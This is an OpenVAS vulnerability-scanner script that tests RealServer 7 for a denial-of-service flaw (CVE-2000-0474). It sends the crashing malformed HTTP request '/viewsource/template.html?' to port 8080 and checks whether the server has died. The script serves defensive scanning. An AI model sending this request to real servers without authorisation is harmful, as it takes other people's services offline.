# OpenVAS Vulnerability Test
# $Id: realserver_malformed_request_dos.nasl 3359 2016-05-19 13:40:42Z antu123 $
# Description: Check for RealServer DoS
#
# Authors:
# John Lampe (j_lampe@bellsouth.net)
#
# Copyright:
# Copyright (C) 2000 John Lampe....j_lampe@bellsouth.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It is possible to crash a RealServer version 7 by sending a malformed http
request.";

tag_solution = "Upgrade to the most recent version of RealServer";

if(description)
{
  script_id(10461);
  script_version("$Revision: 3359 $");
  script_tag(name:"last_modification", value:"$Date: 2016-05-19 15:40:42 +0200 (Thu, 19 May 2016) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(1288);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_cve_id("CVE-2000-0474");
  script_name("Check for RealServer DoS");

  script_summary("Test for DoS in RealServer 7");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2000 John Lampe....j_lampe@bellsouth.net");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/realserver", 7070, 8080);   #port 7070, which may be indicative of server on 8080
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}



#
# The script code starts here
include("http_func.inc");

port = 8080;
if(get_port_state(port)) 
{
    if(http_is_dead(port:port))exit(0);
    
    mysoc = http_open_socket(port);
    if (mysoc) { 
      mystring = http_get(item:"/viewsource/template.html?",
      			  port:port);
      send(socket:mysoc, data:mystring);
    }
    else exit(0);
    http_close_socket(mysoc);
    if(http_is_dead(port:port))security_message(port);
}
